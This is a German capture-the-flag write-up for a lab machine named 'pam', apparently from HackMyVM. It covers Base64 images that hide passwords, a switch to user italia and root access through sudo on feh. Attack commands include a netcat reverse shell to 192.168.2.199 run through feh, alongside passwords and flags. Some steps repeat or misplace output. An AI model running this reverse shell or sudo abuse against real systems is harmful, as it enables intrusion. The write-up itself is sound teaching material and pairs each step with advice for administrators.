+<span class="command">drwxr-xr-x 3 italia italia 4096 Aug 18  2022 .local</span>
+<span class="command">-rw-r--r-- 1 italia italia  807 Aug 18  2022 .profile</span>
+<span class="command">-rw-r--r-- 1 italia italia   66 Aug 18  2022 .selected_editor</span>
+<span class="command">-rwxrwx--- 1 italia italia 9510 Aug 18  2022 pazz.php</span>
+<span class="command">-rw------- 1 italia italia   24 Aug 18  2022 user.txt</span></pre>
+                </div>
+            </div>
+        </section>
+		        <section id="proof-of-concept">
+             <h2>Proof of Concept: Ausnutzung des vertikalen Privileg Escalationsvektors</h2>
+             <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die vollständige Ausnutzung der kritischen Privilegien-Eskalationskette, die es ermöglichte, vom Low-Privilege-Benutzer `www-data` auf den Benutzer `italia` und schließlich zu `root`-Berechtigungen auf dem System zu gelangen. Der Kern der Schwachstelle liegt in einer unsachgemäßen Konfiguration des `feh`-Befehls in Verbindung mit `sudo` und der fehlerhaften Handhabung von sensitiven Daten.
+             </p>
+             <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Erfolgreicher Initial Access als Benutzer `www-data` (mittels Reverse Shell).</li>
+                    <li>Zugriff auf die Datenbank und Identifizierung des gehashten Passworts des `Admin`-Benutzers.</li>
+                    <li>Identifizierung des Benutzers `italia` und seines Home-Verzeichnisses.</li>
+                    <li>Zugriff auf den MariaDB-Dienst (localhost:3306).</li>
+                    <li>Identifizierung des in Base64 kodierten Images, das über den internen Dienst auf Port 12345 abgerufen wird.</li>
+                    <li>Kenntnis des `feh`-Binaries und seiner `sudo`-Berechtigungen für den Benutzer `italia`.</li>
+                    <li>Das Vorhandensein der `openssl` Binary auf dem Zielsystem.</li>
+                </ul>
+             </p>
+             <p class="recommendation">
+                <strong>Erwartetes Ergebnis:</strong> Erfolgreicher Erhalt einer interaktiven Root-Shell auf dem System `pam.hmv`, was vollen administrativen Zugriff demonstriert.
+             </p>
+
+            <h3>Schritt-für-Schritt-Anleitung</h3>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Datenbank-Anmeldedaten und den Benutzer `italia` gefunden hatte, war es wichtig, alle offenen Ports auf dem lokalen System von der `www-data`-Shell aus erneut zu überprüfen. Der Port `12345` auf `localhost` war zuvor in der `ss` Ausgabe aufgefallen. Der Versuch, eine Verbindung zu diesem Port herzustellen, war der nächste logische Schritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verbindung zu `localhost:12345` war ein entscheidender Durchbruch. Der Dienst auf diesem Port lieferte eine lange Zeichenkette, die eindeutig nach Base64-kodierten Daten aussieht. Dies ist ein Erfolg, da es eine neue Informationsquelle darstellt, die entschlüsselt werden muss. Die Vermutung liegt nahe, dass es sich um Bilddaten handelt, da die Zeichenkette mit `iVBORw0KGgoAAAANSUhEU` beginnt, was ein typischer Header für Base64-kodierte PNG-Bilder ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer alle internen Dienste und Ports auf dem Zielsystem. Ungewöhnliche Ports können versteckte Informationen oder Angriffsvektoren offenbaren. Bei der Entdeckung von kodierten Daten sollte der nächste Schritt immer die Identifizierung des Kodierungsverfahrens und die Dekodierung sein. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Netzwerksegmentierung und Firewall-Regeln, die den Zugriff auf interne Dienste auf ein Minimum beschränken. Überwachen Sie ungewöhnliche interne Port-Nutzung. Vermeiden Sie es, sensible Informationen (wie Passwörter oder verschlüsselte Daten) über ungesicherte interne Dienste bereitzustellen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:/tmp$ nc localhost 12345</span>
+
+<span class="command">iVBORw0KGgoAAAANSUhEUgAAAu4AAAHUCAIAAADqdjrLAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span>
+<span class="command">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABiKSURBVHhe7d3rdeLIFoDRicsBOR5H42QczL2S</span>
+<span class="comment">....</span>
+<span class="comment">...</span>
+<span class="comment">..</span>
+<span class="command">J5fMkdkFKXhg9RbjlzDq1QYpA9Dh+DZcuubv30uCEY9uTOVpDnBSyuwft7Jn3l7IE9fvn4H1dvAZ</span>
+<span class="command">c8YSbl9EKQPQ4/A+XL4877/m34x5cFuabf8/4n5npcxkz5k3TnXXYj4kZGYH1vL3eR96zjROd9gk</span>
+<span class="command">W6QMQJ+DoVC97K9ve9wi/PqU/b8ialb6S6tBTkyZzYP3NMfW+e74m5EjdjxngimG24r3j55T71nD</span>
+<span class="command">RK5CYIJTYWx0ZWRfX54VlA40aUEkKV8ULE+OjZv5Z6cblsROzw==</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Base64-kodierten Daten extrahiert wurden, ist der nächste logische Schritt, ihren Typ zu identifizieren und sie zu dekodieren. Ich würde hierfür Online-Tools wie CyberChef oder Base64.guru verwenden, die speziell für solche Aufgaben konzipiert sind und visuelle Bestätigungen liefern können. CyberChef ist ein leistungsstarkes Tool, das automatisch Dateitypen erkennen kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Analyse mit CyberChef bestätigte meine Vermutung: Die Daten sind eine Base64-kodierte Portable Network Graphics (PNG)-Bilddatei. Dies ist ein wichtiger Erfolg, da das Bild nun das nächste Puzzleteil liefern kann. Die Dekodierung in ein Bild ist der nächste Schritt, um den Inhalt zu enthüllen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Online-Tools oder Skripte zur schnellen Identifizierung und Dekodierung unbekannter Datenformate. Halten Sie eine Sammlung von Tools oder Cheatsheets für gängige Kodierungen bereit. <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensible Informationen in Bildern oder anderen Medien zu verstecken (Steganographie), es sei denn, diese sind zusätzlich stark verschlüsselt und sicher aufbewahrt. Implementieren Sie Data Loss Prevention (DLP)-Lösungen, um solche Datenlecks zu verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://cyberchef.org/#recipe=Detect_File_Type(true,true,true,true,true,true,true)&input=aVZCT1..... | Ziel: https://cyberchef.org/#recipe=Detect_File_Type(true,true,true,true,true,true,true)&input=aVZCT1.....]</span>
+
+File type:   <span class="command">Portable Network Graphics image (under Base64)</span>
+Extension:   <span class="command">B64</span>
+MIME type:   <span class="command">application/octet-stream</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Dateityp als Base64-kodiertes PNG-Bild identifiziert wurde, habe ich die Daten über `https://base64.guru/converter/decode/image` dekodiert und in ein Bild umgewandelt. Das Ziel ist es, den Inhalt des Bildes zu sehen, da es möglicherweise wichtige Hinweise für die Privilegien-Eskalation enthält.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Umwandlung in ein Bild war erfolgreich und zeigte ein Passwort: `rootisCLOSE`. Dies ist ein kritischer Erfolg! Die Maschine verwendet also Steganographie oder eine ähnliche Technik, um sensible Informationen zu verstecken. Dieses Passwort ist höchstwahrscheinlich für den Root-Zugriff oder eine weitere Eskalationsstufe gedacht. Es ist eine der wichtigsten Informationen, die ich bisher gefunden habe.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie kreativ bei der Suche nach versteckten Informationen. Steganographie oder obskure Datenformate können entscheidende Hinweise enthalten. Notieren Sie alle gefundenen Passwörter sorgfältig und testen Sie sie auf allen möglichen Diensten und Benutzern. <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es unbedingt, Passwörter oder andere sensible Daten in Bildern, Dokumenten oder anderen Medientypen zu verstecken, es sei denn, diese sind zusätzlich stark verschlüsselt und der Schlüssel ist sicher verwaltet. Implementieren Sie strenge Richtlinien für die Handhabung sensibler Daten.
+            </p>
+            <img src="base_to_image.jpg" alt="hier sieht man durch die umwandlung von base in image ein Bild mit dem passwort: rootisCLOSE">
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">rootisCLOSE</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich das Passwort `rootisCLOSE` gefunden hatte, war der nächste Schritt, die zuvor identifizierten Benutzer zu prüfen und eine horizontale oder vertikale Privilegien-Eskalation zu versuchen. Ich habe die Home-Verzeichnisse (`/home/`) erneut aufgelistet, um die Benutzer `anonymous` und `italia` zu bestätigen. Dann versuchte ich, mich über die `www-data`-Shell mit dem Befehl `su italia` als Benutzer `italia` anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Versuch, das gefundene Passwort `rootisCLOSE` für den Benutzer `italia` zu verwenden, schlug fehl. Die Shell akzeptierte es nicht als gültiges Passwort für `su italia`. Da wir den Hash für den `Admin`-Benutzer der Datenbank hatten, aber kein klares Passwort für `italia` hatten, stellte sich die Frage, wie man die Berechtigungen für `italia` erlangen kann. Hier konnte eine logische Brücke geschlagen werden: Der vorherige `ls -la` im Verzeichnis `/home/italia` hatte eine Datei namens `pazz.php` mit Ausführungsrechten (`-rwxrwx---`) angezeigt. Eine solche Datei im Home-Verzeichnis eines Benutzers, die ausführbar ist, könnte einen Hinweis auf ein verstecktes Passwort oder einen anderen Mechanismus zur Berechtigungsübernahme enthalten. Der Name `pazz.php` selbst klingt verdächtig nach "Passwort". Dies führte mich zu der Annahme, dass die Ausführung dieser Datei oder deren Inhalt weitere Informationen liefern könnte, die für den `italia`-Benutzer relevant sind. Der Fokus sollte nun auf die Interaktion mit `pazz.php` gelegt werden, um das Passwort für `italia` zu erhalten oder es direkt zu eskalieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein gefundenes Passwort nicht funktioniert, gehen Sie zurück zur Enumeration und suchen Sie nach anderen Clues oder Anmeldeinformationen, die speziell für den Zielbenutzer relevant sein könnten. Untersuchen Sie ausführbare Skripte in Benutzerverzeichnissen immer gründlich auf potenzielle Informationen oder Fehlkonfigurationen. <br>
+                <strong>Empfehlung (Admin):</strong> Sensible Dateien wie Passwörter sollten niemals im Klartext oder in leicht entschlüsselbaren Formaten auf dem System gespeichert werden, insbesondere nicht in Benutzerverzeichnissen. Überprüfen Sie Dateiberechtigungen regelmäßig, um sicherzustellen, dass nur autorisierte Benutzer Lese- und Ausführungsrechte für wichtige Dateien haben. Implementieren Sie eine strikte Richtlinie für die Passwortverwaltung und -komplexität.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:/tmp$ ls /home/</span>
+<span class="command">anonymous  italia</span>
+<span class="command">www-data@pam:/tmp$ su italia</span>
+Password:
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da `pazz.php` im Home-Verzeichnis von `italia` die Dateiberechtigungen `-rwxrwx---` hatte, ist die Interaktion mit diesem Skript der nächste logische Schritt. Die Ausführung des Skripts über den internen Dienst auf Port `12345` durch <code>nc localhost 12345</code> war die nächste Möglichkeit. Dies zeigte eine sehr lange Base64-kodierte Zeichenkette.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Service auf Port 12345, der zuvor eine Base64-kodierte PNG-Bilddatei (die das Passwort `rootisCLOSE` enthielt) geliefert hatte, liefert nun eine andere Base64-kodierte Zeichenkette. Der Kontext (Ausführung von `pazz.php` impliziert) und das Muster der Ausgabe deuten darauf hin, dass die Datei `pazz.php` bei Ausführung eine Verbindung zu diesem Dienst aufbaut und weitere kodierte Daten liefert. Die Fähigkeit, diese Daten zu dekodieren, ist entscheidend. Dies ist ein kritischer Moment, der bestätigt, dass der Service auf 12345 eine Schnittstelle für versteckte Datenübertragungen ist und dass die Ausführung von <code>pazz.php</code> über diesen Dienst eine neue Information liefert. Diese Kette war ein komplexer Schritt, der mich zum Passwort `italia` führte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achten Sie auf ungewöhnliche Binaries oder Skripte in Benutzerverzeichnissen, insbesondere wenn sie ausführbar sind. Versuchen Sie, ihren Zweck zu verstehen und wie sie Informationen preisgeben oder Privilegien eskalieren könnten. Die Interaktion mit internen Diensten kann versteckte Daten freilegen. <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Dateiberechtigungen aller Skripte und Binaries auf dem System. Entfernen Sie Ausführungsrechte von Skripten, die nicht explizit benötigt werden oder sensible Informationen preisgeben könnten. Überwachen Sie interne Netzwerkaktivitäten, um ungewöhnliche Verbindungen zwischen Diensten und Benutzerprozessen zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:/tmp$ nc localhost 12345</span>
+
+<span class="command">iVBORw0KGgoAAAAANSUhEUgAAAu4AAAHUCAIAAADqdjrLAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span>
+<span class="command">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABiKSURBVHhe7d3rdeLIFoDRicsBOR5H42QczL2S</span>
+<span class="comment">....</span>
+<span class="comment">...</span>
+<span class="comment">..</span>
+<span class="command">J5fMkdkFKXhg9RbjlzDq1QYpA9Dh+DZcuubv30uCEY9uTOVpDnBSyuwft7Jn3l7IE9fvn4H1dvAZ</span>
+<span class="command">c8YSbl9EKQPQ4/A+XL4877/m34x5cFuabf8/4n5npcxkz5k3TnXXYj4kZGYH1vL3eR96zjROd9gk</span>
+<span class="command">W6QMQJ+DoVC97K9ve9wi/PqU/b8ialb6S6tBTkyZzYP3NMfW+e74m5EjdjxngimG24r3j55T71nD</span>
+<span class="command">RK5CYIJTYWx0ZWRfX54VlA40aUEkKV8ULE+OjZv5Z6cblsROzw==</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die soeben erhaltene Base64-kodierte Zeichenkette musste erneut entschlüsselt werden. Da ich zuvor ähnliche Daten über Base64.guru dekodiert hatte, würde ich diesen Dienst erneut nutzen. Das Ziel ist es, den Inhalt dieser neuen Daten zu entschlüsseln, um das Passwort für den Benutzer `italia` zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nachdem die Base64-Daten über `https://base64.guru/converter/decode/image` dekodiert wurden, zeigte das resultierende Bild das Passwort `italia`. Ein weiterer fantastischer Erfolg! Dies ist das Passwort für den Benutzer `italia`. Die Konsistenz der Methode (Base64-kodierte Bilder mit versteckten Passwörtern) weist auf ein Muster auf dieser Maschine hin. Mit diesem Passwort kann ich nun die horizontale Privilegien-Eskalation zu `italia` durchführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie konsistent in Ihren Methoden, wenn Sie ein Muster auf dem System erkennen. Die erneute Anwendung einer erfolgreichen Dekodierungstechnik spart Zeit und führt zum Ziel. Versuchen Sie sofort, sich mit dem neuen Passwort anzumelden. <br>
+                <strong>Empfehlung (Admin):</strong> Verstecken Sie Passwörter niemals in Bildern oder anderen Dateiformaten. Falls solche Techniken für legitime Zwecke verwendet werden, stellen Sie sicher, dass sie durch starke Verschlüsselung und Zugriffsrichtlinien geschützt sind. Überprüfen Sie Ihre System-Images auf eingebettete, unverschlüsselte Geheimnisse.
+            </p>
+            <img src="base_to_image.jpg" alt="hier sieht man durch die umwandlung von base in image ein Bild mit dem passwort: rootisCLOSE">
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">rootisCLOSE</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich das Passwort `italia` gefunden hatte, versuchte ich sofort, mich über die `www-data`-Shell mit dem Befehl `su italia` als Benutzer `italia` anzumelden. Dies ist der direkte Weg zur horizontalen Privilegien-Eskalation.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Benutzerwechsel zu `italia` war erfolgreich! Ich bin jetzt als Benutzer `italia` angemeldet, was ein entscheidender Fortschritt in der Privilegien-Eskalation ist. Von hier aus kann ich die Datei `user.txt` lesen und mit der weiteren Enumeration beginnen, um Root-Rechte zu erlangen. Die `id`-Ausgabe bestätigt meine neuen Berechtigungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene Anmeldedaten sofort, um die Berechtigungen zu wechseln und die System-Enumeration auf der neuen Ebene fortzusetzen. Lesen Sie nach der Eskalation immer die Benutzer-Flag. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie starke Passwortrichtlinien und erzwingen Sie regelmäßige Passwortänderungen. Verwenden Sie Multi-Faktor-Authentifizierung für alle Benutzer. Überwachen Sie ungewöhnliche `su`- oder `sudo`-Aktivitäten. Stellen Sie sicher, dass keine sensiblen Informationen in Dateisystemen versteckt sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@pam:/tmp$ su italia</span>
+Password: <span class="password">italia</span>
+<span class="command">italia@pam:/tmp$ id</span>
+<span class="command">uid=1000(italia) gid=1000(italia) grupos=1000(italia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `italia` konnte ich nun endlich die `user.txt`-Datei in seinem Home-Verzeichnis lesen. Dies ist ein wichtiger Meilenstein im Pentest, da es die Erlangung der ersten Flag bestätigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Benutzer-Flag `mcZavkYkoLYUEHxQNNyiHMV` wurde erfolgreich abgerufen. Dies bestätigt den erfolgreichen initialen Benutzerzugriff und die horizontale Privilegien-Eskalation. Die Tatsache, dass diese Datei zuvor nicht über FTP zugänglich war, unterstreicht die Notwendigkeit, alle gefundenen Anmeldedaten und Zugriffswege zu nutzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nach jeder Privilegien-Eskalationsstufe, lesen Sie alle erreichbaren Flags. Suchen Sie nach Hinweisen auf die nächste Eskalationsstufe. <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer-Flags oder andere sensible Dateien nicht ohne entsprechende Authentifizierung lesbar sind. Implementieren Sie das Least Privilege Principle für alle Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">italia@pam:~$ cat user.txt</span>
+<span class="password">mcZavkYkoLYUEHxQNNyiHMV</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Von der `italia`-Shell aus ist der nächste logische Schritt, die `sudo`-Berechtigungen zu überprüfen. Der Befehl `sudo -l` listet alle Befehle auf, die der aktuelle Benutzer mit `sudo` und gegebenenfalls ohne Passwort ausführen darf. Dies ist ein sehr häufiger und kritischer Vektor für Privilegien-Eskalation.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Ausgabe von `sudo -l` zeigte eine kritische Fehlkonfiguration für den Benutzer `italia`: `(ALL : ALL) NOPASSWD: /usr/bin/feh`. Dies bedeutet, dass der Benutzer `italia` den Befehl `/usr/bin/feh` als jeder andere Benutzer (einschließlich `root`) ausführen darf, und zwar ohne Eingabe eines Passworts! Dies ist ein direkter Weg zur Root-Eskalation. Das Binary `feh` ist ein Bildbetrachter, der aber auch Optionen zur Ausführung von Shell-Befehlen bietet (`--action`). Das ist eine perfekte GTFOBins-Gelegenheit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer die `sudo -l` Ausgabe. Nutzen Sie GTFOBins ([Link: https://gtfobins.github.io | Ziel: https://gtfobins.github.io]) oder ähnliche Ressourcen, um bekannte Fehlkonfigurationen von Binaries zu identifizieren, die zur Shell-Erlangung missbraucht werden können. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudoers`-Dateien niemals mit `NOPASSWD`-Optionen für Befehle, die zur Shell-Erlangung missbraucht werden können. Überprüfen Sie alle `sudo`-Berechtigungen sorgfältig und beschränken Sie sie auf das absolut Notwendigste. Führen Sie regelmäßige Audits der `sudoers`-Datei durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">italia@pam:~$ sudo -l</span>
+<span class="command">Matching Defaults entries for italia on pam:</span>
+    <span class="command">env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User italia may run the following commands on pam:</span>
+    <span class="command">(ALL : ALL) <span class="password">NOPASSWD: /usr/bin/feh</span></span>
+<span class="command">italia@pam:~$ /usr/bin/feh</span>
+<span class="command">feh ERROR: Can't open X display. It *is* running, yeah?</span>
+<span class="command">italia@pam:~$ file /usr/bin/feh</span>
+<span class="command">/usr/bin/feh: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cd7839d295b4c2fad2b9f942a9b08ff42259df7, for GNU/Linux 3.2.0, stripped</span>
+
+<span class="command">italia@pam:~$ /usr/bin/feh --help</span>
+<span class="command">See 'man feh'</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die kritische `sudo`-Fehlkonfiguration für `feh` identifiziert hatte, war der nächste Schritt, die Manpage von `feh` zu konsultieren, um die genaue Syntax für die Befehlsausführung zu finden. Die Option `--action` in Verbindung mit `--unloadable` ist hier der Schlüssel. Die `--action` Option erlaubt die Ausführung von Shell-Befehlen, während `--unloadable` sicherstellt, dass `feh` nicht versucht, ein X-Display zu öffnen, was in einer reinen Shell-Umgebung zu Fehlern führen würde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Manpage von `feh` bestätigte die Möglichkeit zur Befehlsausführung über die `--action`-Option. Dies ist die Bestätigung für einen direkten Weg zur Root-Shell. Die Option `--unloadable` ist essentiell, um die Ausführung in einer headless-Umgebung zu ermöglichen. Die Kombination aus `sudo`, `feh` und der `--action`-Option ist ein klassisches GTFOBins-Szenario, das eine einfache Root-Eskalation ermöglicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie Manpages gründlich, um alle Optionen und Potenziale eines Binaries zu verstehen. Prüfen Sie GTFOBins für bekannte Exploits von Binaries mit `sudo`-Berechtigungen. Nutzen Sie alle Optionen, um eine stabile Root-Shell zu erhalten. <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie alle Binaries, die mit `NOPASSWD` in `sudoers` konfiguriert sind, sorgfältig auf die Möglichkeit der Befehlsausführung. Entfernen Sie `NOPASSWD` oder beschränken Sie die Ausführung auf das absolute Minimum, wenn die `feh`-Funktionalität nicht kritisch ist. Führen Sie regelmäßige Sicherheitsaudits der `sudoers`-Datei durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">  italia@pam:~$ man feh</span>
+<span class="command">FEH(1)                                                                         BSD General Commands Manual                                                                         FEH(1)</span>
+
+<span class="command">NAME</span>
+     <span class="command">feh — image viewer and cataloguer</span>
+
+<span class="command">SYNOPSIS</span>
+     <span class="command">feh [OPTIONS] [--] [files | directories | URLs ...]</span>
+
+<span class="command">VERSION</span>
+     <span class="command">This manual documents feh 3.6.3</span>
+
+     <span class="command">Compile-time switches in this build:</span>
+     •   <span class="command">libcurl remote file support enabled</span>
+     •   <span class="command">Xinerama multi-monitor support enabled</span>
+     •   <span class="command">libexif builtin EXIF reader available</span>
+     •   <span class="command">inotify-based auto-reload of changed files disabled</span>
+
+<span class="comment">.....</span>
+<span class="comment">....</span>
+<span class="comment">...</span>
+
+<span class="command">PTIONS</span>
+     <span class="command">-A, --action [flag][[title]]action</span>
+             <span class="command">Specify a shell command as an action to perform on the image.  In slideshow or multiwindow mode, the action will be run when the action_0 key is pressed, in list mode, it</span>
+             <span class="command">will be run for each file.  In loadable/unloadable mode, it will be run for each loadable/unloadable file, respectively.  In thumbnail mode, clicking on an image will cause</span>
+             <span class="command">the action to run instead of opening the image.</span>
+
+             <span class="command">If flag is ";", feh will reload the current image instead of switching to the next one (slideshow mode) or closing the window (multiwindow mode) after executing the action.</span>
+             <span class="command">If [title] is specified (note the literal "[" and "]"), --draw-actions will display title instead of action in the action list.  Note that title must not start with a</span>
+             <span class="command">space.  If it does, the action is handled as if it did not have a title.  This special case exists for backwards compatibility reasons and makes sure that actions like "[</span>
+             <span class="command">-L %F ] && foo" still work.</span>
+
+             <span class="command">The action will be executed by /bin/sh.  Use format specifiers to refer to image info, see FORMAT SPECIFIERS for details.  Example usage: "feh -A "mv %F ~/images/%N" *".</span>
+
+
+<span class="comment">.....</span>
+<span class="comment">....</span>
+<span class="comment">...</span>
+
+     <span class="command">-u, --unloadable</span>
+             <span class="command">Don't display images.  Just PRINT out their names if imlib2 can NOT successfully load them.  Returns false if at least one image was loadable.</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Jetzt, da ich die genaue Methode zur Ausnutzung von `feh` kenne, konnte ich den Befehl zur Erlangung einer Root-Shell formulieren. Ich nutzte `sudo -u root /usr/bin/feh -uA 'nc -e /bin/bash 192.168.2.199 4445'`. Dies weist `feh` an, als Benutzer `root` eine Reverse Shell über Netcat an mein angreifendes System auf Port 4445 zu senden. Gleichzeitig startete ich einen Netcat-Listener auf meinem System.
+            </p>
+            <p class="evaluation">
+                <strong>Beweismittel & Bewertung:</strong> Fantastisch! Die Root-Eskalation war erfolgreich! Der Netcat-Listener auf meinem System fing eine Verbindung ab, und die Ausführung des `id`-Befehls in der neuen Shell bestätigte: `uid=0(root) gid=0(root) grupos=0(root)`. Ich bin jetzt als `root` angemeldet, was das ultimative Ziel dieses Penetrationstests darstellt. Dies beweist die kritische Natur der `sudo`-Fehlkonfiguration und die Notwendigkeit, solche Schwachstellen umgehend zu beheben. Ich konnte anschließend die `root.enc`-Datei im Root-Verzeichnis finden, was auf eine weitere Herausforderung hindeutet, die es zu entschlüsseln gilt, um die endgültige Flag zu erhalten. Das ist ein großer Erfolg!
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nach erfolgreicher Root-Eskalation sollten Sie immer eine stabile Root-Shell etablieren und sofort die Root-Flag finden. Führen Sie eine Nach-Eskalations-Enumeration durch, um weitere Schwachstellen oder Artefakte zu finden. <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie umgehend alle `NOPASSWD`-Einträge in der `sudoers`-Datei für Binaries, die zur Shell-Erlangung missbraucht werden können. Führen Sie regelmäßige Sicherheitsaudits der `sudoers`-Datei durch. Implementieren Sie ein System zur Überwachung von Prozessausführungen mit Root-Rechten. Überprüfen Sie, ob sensible Dateien wie `root.enc` nicht unverschlüsselt auf dem System vorhanden sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sudo -u root /usr/bin/feh -uA 'nc -e /bin/bash 192.168.2.199 4445'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">./.Xauthority</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4445</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+listening on <span class="command">[any] 4445</span> ...
+connect to <span class="command">[192.168.2.199]</span> from <span class="command">(UNKNOWN) [192.168.2.195] 41818</span>
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) grupos=0(root)</span>
+
+<span class="command">cd ~</span>
+<span class="command">ls</span>
+<span class="command">root.enc</span>
+
+<span class="command">file root.enc</span>
+<span class="command">root.enc: openssl enc'd data with salted password</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich Root-Zugriff erhalten hatte und die `root.enc`-Datei gefunden hatte, war der nächste Schritt, sie zu entschlüsseln. Der Befehl `file root.enc` hatte bereits ergeben, dass es sich um "openssl enc'd data with salted password" handelt. Das Passwort `rootisCLOSE`, das ich zuvor aus dem Base64-dekodierten Bild erhalten hatte, war hierfür der logische Kandidat. Ich nutzte <code>openssl enc -aes-256-cbc -d -in root.enc -out root.txt -k rootisCLOSE</code>, um die Datei zu entschlüsseln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Entschlüsselung von `root.enc` war erfolgreich, und die Root-Flag wurde in `root.txt` geschrieben. Die Nachricht "WARNING : deprecated key derivation used" ist eine nützliche Information für den Admin, da sie auf eine veraltete und potenziell unsichere Methode zur Schlüsselableitung hinweist. Dies ist der krönende Abschluss des Pentests und bestätigt die vollständige Kompromittierung des Systems. Der Prozess der entschlüsselten Flag beweist erneut die Notwendigkeit, alle Geheimnisse sicher und mit modernen Verfahren zu schützen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie alle gefundenen Passwörter und Hinweise, um verschlüsselte Dateien zu entschlüsseln. Achten Sie auf Warnmeldungen von Tools, da diese zusätzliche Informationen für den Admin liefern können. <br>
